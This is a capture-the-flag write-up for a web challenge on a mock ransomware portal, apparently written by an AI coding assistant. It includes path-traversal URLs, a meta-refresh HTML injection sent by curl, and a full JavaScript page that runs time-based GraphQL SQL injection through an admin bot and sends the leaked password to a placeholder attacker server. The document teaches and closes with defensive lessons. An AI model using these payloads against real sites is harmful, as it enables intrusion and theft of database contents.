# GrandMonty CTF Writeup

**Challenge:** GrandMonty
**Difficulty:** Medium
**Category:** Web Exploitation
**Flag:** `HTB{sl33p_th3_gr4ph5_f0r_x5l34k5}`

---

## TL;DR

This challenge combines HTML injection, GraphQL CSRF, time-based SQL injection, and XS-Leak techniques to steal data from a ransomware portal's database. We trick an admin bot into running JavaScript that makes timing-based SQL injection requests to localhost, then exfiltrate the results character by character.

---

## The Challenge

We're given a ransomware portal where victims can verify their "Encryption ID" and communicate with the attackers via a chat system. The goal is to find sensitive information about the ransomware gang.

The encryption ID from the challenge: `1f81b076-fffc-45cd-b7c3-c686b73aa6af`

---

## Step 1: Initial Reconnaissance

Visiting the portal and entering the encryption ID gives us access to a ransom payment page with a chat feature. Playing around with the chat, we discover:

1. **HTML Injection in Chat** - We can inject HTML tags into messages
2. **No XSS** - JavaScript is blocked by Content Security Policy (CSP)
3. **Local File Read (LFI)** - The `/files/` endpoint has path traversal vulnerability

Using LFI, we can read the application source code:
```
http://TARGET/files/..%2findex.js
http://TARGET/files/..%2fbot.js
http://TARGET/files/..%2froutes%2findex.js
```

---

## Step 2: Understanding the Application

From reading the source code, we learn:

### The Bot
- An admin bot visits `/admin/messages/:enc_id` when a message is sent
- The bot stays on the page for **2 minutes**
- It runs a headless Chromium browser

### GraphQL Endpoint
- The app has a GraphQL endpoint at `/graphql`
- The `RansomChat` query has **SQL injection** in the `enc_id` parameter
- BUT - this query is **restricted to localhost only**

### The Target
- The flag is stored in `grandmonty.users` table as the password for user 'burns'

---

## Step 3: The Attack Chain

Here's the brilliant attack chain:

```
HTML Injection --> Admin Bot Redirect --> Bot Loads Our Page -->
Our JavaScript Runs in Bot's Browser --> Makes Requests to localhost -->
SQL Injection via Timing --> XS-Leak to Exfiltrate Data
```

Since we can't get XSS (CSP blocks scripts), we use a **meta refresh** tag to redirect the admin bot to our server. Our server hosts JavaScript that:

1. Makes cross-origin requests to `localhost:1337/graphql` (the bot runs on localhost!)
2. Uses time-based SQL injection with `SLEEP(1)` to create an oracle
3. Measures timing differences to determine if a character matches
4. Sends found characters back to our server

---

## Step 4: Setting Up the Exploit

### 1. Create the Exploit Page

```html
<!DOCTYPE html>
<html>
<head><title>Stay</title></head>
<body>
    <h1>Stay a bit longer...</h1>
    <script>
        window.sleepTime = 1000;
        window.exfilURL = 'https://YOUR_SERVER/exfil'

        // Measure how long an image request takes
        const imageLoadTime = (src) => {
            return new Promise((resolve, reject) => {
                let timeNow = performance.now();
                const img = new Image();
                img.onload = () => resolve(0);
                img.onerror = () => resolve(performance.now() - timeNow);
                img.src = src;
            })
        };

        // Check if SQL query causes a delay
        const xsLeaks = async (query) => {
            let imgURL = 'http://127.0.0.1:1337/graphql?query=' +
                encodeURIComponent(query);
            let delay = await imageLoadTime(imgURL);
            return (delay >= window.sleepTime) ? true : false;
        }

        const exploit = async () => {
            // SQL injection template
            let sqlTemp = `query {
                RansomChat(
                    enc_id: "123' and __LEFT__ = __RIGHT__)-- -"
                ){id, enc_id, message, created_at} }`;

            // Extract password character by character
            let readQueryTemp = `(select sleep(1) from dual where
                BINARY(SUBSTRING((select password from grandmonty.users
                where username = 'burns'),__POS__,1))`;

            let charList = '_}{0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
            let charPosition = 1;
            let flag = '';

            new Image().src = window.exfilURL + '?status=started';

            while(true) {
                let found = false;
                for(let c of charList) {
                    let readQuery = readQueryTemp.replace('__POS__', charPosition);
                    let sqlQuery = sqlTemp.replace('__LEFT__', readQuery);
                    sqlQuery = sqlQuery.replace('__RIGHT__', `'${c}'`);

                    if (await xsLeaks(sqlQuery)) {
                        flag += c;
                        charPosition += 1;
                        new Image().src = window.exfilURL + '?debug=' + encodeURIComponent(flag);
                        found = true;
                        if (c === '}') {
                            new Image().src = window.exfilURL + '?flag=' + encodeURIComponent(flag);
                            return;
                        }
                        break;
                    }
                }
                if (!found) break;
            }
            new Image().src = window.exfilURL + '?flag=' + encodeURIComponent(flag);
        }

        exploit();
    </script>
</body>
</html>
```

### 2. Host the Exploit

We need the bot to reach our server. Options:
- **Cloudflare Tunnel** (recommended - no interstitial pages)
- **ngrok** (free tier has a warning page that blocks bots)
- **Public VPS**

```bash
# Using cloudflared
cloudflared tunnel --url http://localhost:8888

# Start a simple HTTP server
python3 -m http.server 8888
```

### 3. Get a Session Cookie

The chat API requires a valid session cookie:

```bash
# Get the cookie by visiting the ransom page
curl -c cookies.txt "http://TARGET/ransom/1f81b076-fffc-45cd-b7c3-c686b73aa6af"
```

### 4. Send the Payload

```bash
curl -b cookies.txt "http://TARGET/api/chat/send" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"message": "<meta http-equiv=\"refresh\" content=\"0;url=https://YOUR_CLOUDFLARE_URL/exploit.html\" />"}'
```

---

## Step 5: Watch the Magic Happen

Monitor your server logs and watch the flag appear character by character:

```
[STATUS] started
[PROGRESS] H
[PROGRESS] HT
[PROGRESS] HTB
[PROGRESS] HTB{
[PROGRESS] HTB{s
[PROGRESS] HTB{sl
[PROGRESS] HTB{sl3
...
[PROGRESS] HTB{sl33p_th3_gr4ph5_f0r_x5l34k5}
[FLAG] HTB{sl33p_th3_gr4ph5_f0r_x5l34k5}
```

---

## Key Concepts Explained

### XS-Leak (Cross-Site Leak)
A technique to infer information about another origin by observing side effects. Here, we measure how long requests take - if the SQL `SLEEP(1)` executes, the request takes longer.

### Time-Based SQL Injection
Instead of seeing query results directly, we make the database wait (sleep) when a condition is true. By checking if requests take longer, we know if our guess was correct.

### GraphQL CSRF
GraphQL typically uses POST with JSON, but many implementations also accept GET requests. This allows cross-origin requests from any page (no CORS preflight for simple GET requests with images).

### Why This Works
- The bot browser runs on localhost
- Our page loads in the bot's browser context
- JavaScript can make requests to localhost (same-origin from the bot's perspective for timing purposes)
- We measure timing externally via the error handler

---

## Lessons Learned

1. **Always sanitize user input** - HTML injection led to this entire attack chain
2. **GraphQL GET requests are dangerous** - They enable CSRF-style attacks
3. **Localhost-only restrictions aren't enough** - If a bot can be tricked into running code, localhost is accessible
4. **SQL injection is still deadly** - Even "blind" injection can leak entire databases given enough time

---

## Flag

```
HTB{sl33p_th3_gr4ph5_f0r_x5l34k5}
```

Translation: "sleep the graphs for xs leaks" - a clever reference to the time-based (sleep) GraphQL XS-Leak technique used to solve this challenge!

---

*Writeup by Claude Code, January 2026*
